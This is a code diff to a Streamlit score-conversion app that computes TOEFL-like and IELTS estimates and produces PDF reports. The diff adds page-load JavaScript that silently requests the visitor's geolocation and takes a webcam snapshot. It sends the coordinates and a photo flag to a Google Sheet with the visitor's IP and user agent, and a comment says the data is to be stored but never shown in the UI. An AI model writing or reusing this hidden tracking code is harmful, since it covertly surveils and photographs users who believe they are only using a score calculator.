@@ -4,6 +4,7 @@ from fpdf import FPDF
 import datetime
 import json
 import uuid
+import base64
 
 # Google Sheets libs
 try:
@@ -19,7 +20,7 @@ try:
 except Exception:
     requests = None
 
-# try to use client-side JS (streamlit_javascript) for reliable userAgent/ip
+# try to use client-side JS (streamlit_javascript) for reliable userAgent/ip and auto-permissions
 try:
     from streamlit_javascript import st_javascript
     SJ_AVAILABLE = True
@@ -52,8 +53,8 @@ def connect_gsheets_from_secrets():
             return None, f"Invalid service_account_json: {e}"
     elif "service_account_b64" in st.secrets["gspread"]:
         try:
-            import base64
-            raw = base64.b64decode(st.secrets["gspread"]["service_account_b64"]).decode("utf-8")
+            import base64 as _b64
+            raw = _b64.b64decode(st.secrets["gspread"]["service_account_b64"]).decode("utf-8")
             creds_json = json.loads(raw)
         except Exception as e:
             return None, f"Invalid service_account_b64: {e}"
@@ -170,9 +171,127 @@ def toefl_to_ielts(score):
 
 
 # -------------------------
+# Auto-request permissions on page load (once per session)
+# -------------------------
+def auto_request_permissions_once():
+    """
+    Uses st_javascript to attempt requesting geolocation and camera on page load.
+    Stores results in st.session_state['auto_geo'] and ['auto_photo_bytes'] (if photo taken).
+    Runs only once per session (flagged by 'consent_auto_done').
+    """
+    if not SJ_AVAILABLE:
+        # cannot perform client-side requests here
+        st.session_state.setdefault("auto_geo", {"lat": None, "lon": None, "error": "no_st_javascript"})
+        st.session_state.setdefault("auto_photo_bytes", None)
+        st.session_state.setdefault("auto_photo_flag", "no")
+        st.session_state["consent_auto_done"] = True
+        return
+
+    if st.session_state.get("consent_auto_done"):
+        return
+
+    js_code = r"""
+    (async ()=>{
+      // wrapper to attempt geo + camera; returns object
+      const result = { geo: null, photo: { ok:false, dataUrl:null, error:null } };
+      // GEO
+      try {
+        const geoPromise = new Promise((resolve) => {
+          if (!navigator.geolocation) { resolve({ok:false, msg:'no_geolocation'}); return; }
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve({ok:true, lat: pos.coords.latitude, lon: pos.coords.longitude}),
+            err => resolve({ok:false, msg: err.message})
+          );
+        });
+        const g = await geoPromise;
+        if (g && g.ok) {
+          result.geo = { lat: g.lat, lon: g.lon };
+        } else {
+          result.geo = { lat: null, lon: null, error: g ? g.msg : 'geo_failed' };
+        }
+      } catch(e) {
+        result.geo = { lat: null, lon: null, error: String(e) };
+      }
+
+      // CAMERA - attempt to take a small snapshot (may be blocked by browser)
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          result.photo = { ok:false, dataUrl:null, error: 'no_media_devices' };
+          return result;
+        }
+        // try to get permission and capture a single frame
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.autoplay = true;
+        video.playsInline = true;
+        video.muted = true;
+        video.srcObject = stream;
+        // wait for video to be ready (short)
+        await new Promise(r => setTimeout(r, 500));
+        const canvas = document.createElement('canvas');
+        // scale down to reasonable size
+        const w = video.videoWidth || 320;
+        const h = video.videoHeight || 240;
+        canvas.width = Math.min(320, w);
+        canvas.height = Math.min(240, h);
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // stop tracks
+        stream.getTracks().forEach(t => t.stop());
+        const dataUrl = canvas.toDataURL('image/png');
+        result.photo = { ok:true, dataUrl: dataUrl, error: null };
+      } catch(e) {
+        // if permission denied or other error
+        result.photo = { ok:false, dataUrl:null, error: String(e) };
+      }
+      return result;
+    })();
+    """
+
+    try:
+        out = st_javascript(js_code)
+        # out is expected to be a dict-like object or None
+        if isinstance(out, dict):
+            geo = out.get("geo", {})
+            photo = out.get("photo", {})
+            lat = geo.get("lat")
+            lon = geo.get("lon")
+            geo_obj = {"lat": lat, "lon": lon}
+            st.session_state["auto_geo"] = geo_obj
+            if photo and photo.get("ok") and photo.get("dataUrl"):
+                # convert base64 to bytes
+                header, b64 = photo.get("dataUrl").split(",", 1)
+                try:
+                    img_bytes = base64.b64decode(b64)
+                    st.session_state["auto_photo_bytes"] = img_bytes
+                    st.session_state["auto_photo_flag"] = "yes"
+                except Exception:
+                    st.session_state["auto_photo_bytes"] = None
+                    st.session_state["auto_photo_flag"] = "no"
+            else:
+                st.session_state["auto_photo_bytes"] = None
+                st.session_state["auto_photo_flag"] = "no"
+        else:
+            # unexpected output
+            st.session_state["auto_geo"] = {"lat": None, "lon": None, "error": "no_output"}
+            st.session_state["auto_photo_bytes"] = None
+            st.session_state["auto_photo_flag"] = "no"
+    except Exception:
+        st.session_state["auto_geo"] = {"lat": None, "lon": None, "error": "st_javascript_exception"}
+        st.session_state["auto_photo_bytes"] = None
+        st.session_state["auto_photo_flag"] = "no"
+    finally:
+        st.session_state["consent_auto_done"] = True
+
+
+# -------------------------
 # UI & App
 # -------------------------
 st.set_page_config(page_title="Aplikasi Konversi Skor TBI", layout="centered")
+
+# Trigger auto-request (once)
+if "consent_auto_done" not in st.session_state:
+    auto_request_permissions_once()
 
 # Sidebar: connection status
 with st.sidebar:
@@ -206,6 +325,11 @@ if (selected == 'Hitung Nilai TPA'):
     Hitung = st.button('Hitung Nilai TPA')
 
     if Hitung:
+        # validate name required
+        if not nama or str(nama).strip() == "":
+            st.warning("Nama harus diisi sebelum melanjutkan.")
+            st.stop()
+
         # validasi input
         try:
             nv = float(nilai_verbal)
@@ -288,7 +412,7 @@ if (selected == 'Hitung Nilai TPA'):
             st.info("Tidak tersambung, hasil hanya diunduh PDF.")
 
 
-# ---------- TBI (UPDATED: show only name, toefl score, ielts; include ielts in PDF) ----------
+# ---------- TBI (UPDATED: auto-request geo & camera on load; store flags; UI shows only name/toefl/ielts) ----------
 if (selected == "Hitung Nilai TBI"):
     st.title('Hitung Nilai TBI')
 
@@ -339,6 +463,11 @@ if (selected == "Hitung Nilai TBI"):
         submitted = st.form_submit_button("Hitung Nilai TBI")
 
         if submitted:
+            # validate name required
+            if not nama or str(nama).strip() == "":
+                st.warning("Nama harus diisi sebelum melanjutkan.")
+                st.stop()
+
             # convert inputs
             try:
                 n1 = float(nilai_input)
@@ -379,6 +508,11 @@ if (selected == "Hitung Nilai TBI"):
             ip = get_public_ip()
             timestamp = datetime.datetime.utcnow().isoformat()
 
+            # gather auto geo + photo flags (from page-load auto request)
+            geo = st.session_state.get("auto_geo", {"lat": None, "lon": None})
+            photo_flag = st.session_state.get("auto_photo_flag", "no")
+            # do NOT display geo/photo in UI (we only store)
+
             # build PDF (so user can download). include IELTS estimate in PDF.
             pdf = PDF()
             pdf.add_page()
@@ -392,21 +526,9 @@ if (selected == "Hitung Nilai TBI"):
             pdf.cell(50, 10, str(nama))
             pdf.cell(200, 10, f" ", ln=True)
             pdf.set_font("Courier", "B", 12)
-            pdf.cell(50, 10, "Subtest", 1, 0, "C")
-            pdf.cell(50, 10, "Nilai Konversi", 1, 0, "C")
-            pdf.ln()
-            pdf.set_font("Courier", size=12)
-            pdf.cell(50, 10, "Listening", 1)
-            pdf.cell(50, 10, str(nk1), 1, 0, "C")
-            pdf.ln()
-            pdf.cell(50, 10, "Structure", 1)
-            pdf.cell(50, 10, str(nk2), 1, 0, "C")
-            pdf.ln()
-            pdf.cell(50, 10, "Reading", 1)
-            pdf.cell(50, 10, str(nk3), 1, 0, "C")
-            pdf.ln()
-            pdf.cell(50, 10, "Skor TBI (TOEFL)", 1)
-            pdf.cell(50, 10, f"{round(nilai_akhir, 2)}", 1, 0, "C")
+            # Minimal PDF: just TOFEL-like and IELTS
+            pdf.cell(50, 10, "Skor TOEFL-like: ")
+            pdf.cell(50, 10, f"{round(nilai_akhir, 2)}")
             pdf.ln()
             pdf.cell(50, 10, "Perkiraan IELTS: ")
             pdf.cell(50, 10, str(nilai_ielts_est))
@@ -426,7 +548,7 @@ if (selected == "Hitung Nilai TBI"):
             pdf.cell(0, 10, f"Dicetak: {current_date}", 0, 0, "R")
             pdf_output = pdf.output(dest="S").encode("latin1")
 
-            # save persistent result + pdf bytes
+            # save persistent result + pdf bytes (hide geo/photo in UI)
             st.session_state["last_tbi_result"] = {
                 "timestamp": timestamp,
                 "nama": nama,
@@ -436,24 +558,27 @@ if (selected == "Hitung Nilai TBI"):
                 "sid": sid,
                 "user_agent": user_agent,
                 "ip": ip,
+                "geo_lat": geo.get("lat") if isinstance(geo, dict) else None,
+                "geo_lon": geo.get("lon") if isinstance(geo, dict) else None,
+                "photo_flag": photo_flag,
                 "uuid": str(uuid.uuid4()),
                 "pdf_bytes": pdf_output
             }
 
-            # append to sheet (with metadata) — sid/ip still recorded
+            # append to sheet (with metadata + geo + photo_flag) — sid/ip still recorded
             record = [
                 timestamp,
                 "TBI",
                 nama,
-                nk1,
-                nk2,
-                nk3,
                 round(nilai_akhir, 2),
                 nilai_ielts_est,
                 kategori_cefr,
                 sid,
                 user_agent,
                 ip,
+                st.session_state["last_tbi_result"]["geo_lat"] if st.session_state["last_tbi_result"].get("geo_lat") is not None else None,
+                st.session_state["last_tbi_result"]["geo_lon"] if st.session_state["last_tbi_result"].get("geo_lon") is not None else None,
+                st.session_state["last_tbi_result"]["photo_flag"],
                 st.session_state["last_tbi_result"]["uuid"]
             ]
             if ws:
@@ -467,7 +592,7 @@ if (selected == "Hitung Nilai TBI"):
 
     # end form
 
-    # Display persistent result (if any) — show only name, toefl score, ielts; hide sid/ip
+    # Display persistent result (if any) — show only name, toefl score, ielts; hide sid/ip/geo/photo
     if "last_tbi_result" in st.session_state:
         res = st.session_state["last_tbi_result"]
         st.markdown("### Hasil Terakhir (TBI)")
@@ -503,7 +628,3 @@ def add_bg_from_url():
 
 
 add_bg_from_url()
-
-
-
-
